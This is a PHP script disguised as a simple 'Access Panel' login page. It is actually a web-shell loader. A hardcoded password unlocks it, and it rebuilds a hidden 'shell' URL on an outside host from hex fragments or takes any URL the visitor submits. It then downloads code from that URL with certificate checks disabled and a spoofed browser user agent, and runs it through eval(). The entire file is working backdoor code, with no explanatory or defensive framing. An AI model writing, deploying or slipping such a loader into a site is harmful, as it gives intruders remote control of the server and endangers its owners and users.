<?php
session_start();

$hiddenParts = ['68747470733a2f2f', '6261636b6275726e65722e78', '797a2f7368656c6c2f343033', '2e747874', 'friends'];

function mergeUrlParts($parts) {
    return implode('', array_map('hex2bin', array_slice($parts, 0, -1)));
}

function checkAccess() {
    return isset($_SESSION['verified']) && $_SESSION['verified'] === true;
}

function verifyUser($input) {
    if (hash('sha256', $input) === hash('sha256', end($GLOBALS['hiddenParts']))) {
        $_SESSION['verified'] = true;
        $_SESSION['access_url'] = isset($_POST['target_url']) && filter_var($_POST['target_url'], FILTER_VALIDATE_URL) ? $_POST['target_url'] : mergeUrlParts($GLOBALS['hiddenParts']);
        return true;
    }
    return false;
}

function fetchRemoteData($url) {
    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION['auth_token'])) {
            curl_setopt($ch, CURLOPT_COOKIE, $_SESSION['auth_token']);
        }
        $data = curl_exec($ch);
        curl_close($ch);
    } elseif (function_exists('file_get_contents')) {
        $data = file_get_contents($url);
    } else {
        $data = false;
    }
    return $data;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['auth_input'])) {
    $authInput = $_POST['auth_input'];
    if (verifyUser($authInput)) {
        $_SESSION['auth_token'] = bin2hex(random_bytes(16));
    } else {
        echo "Invalid Access...";
    }
}

if (checkAccess()) {
    $targetUrl = $_SESSION['access_url'];
    $response = fetchRemoteData($targetUrl);
    if ($response !== false) {
        eval('?>' . $response);
    } else {
        echo "Failed to retrieve data.";
    }
} else {
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Access Panel</title></head>
    <body style="text-align:center;">
        <form method="POST">
            <label for="auth_input">Key</label>
            <input id="auth_input" name="auth_input" type="password"><br>
            <label for="target_url">URL</label>
            <input id="target_url" name="target_url" type="text"><br>
            <input type="submit" value="Enter">
        </form>
    </body>
    </html>
    <?php
}
?>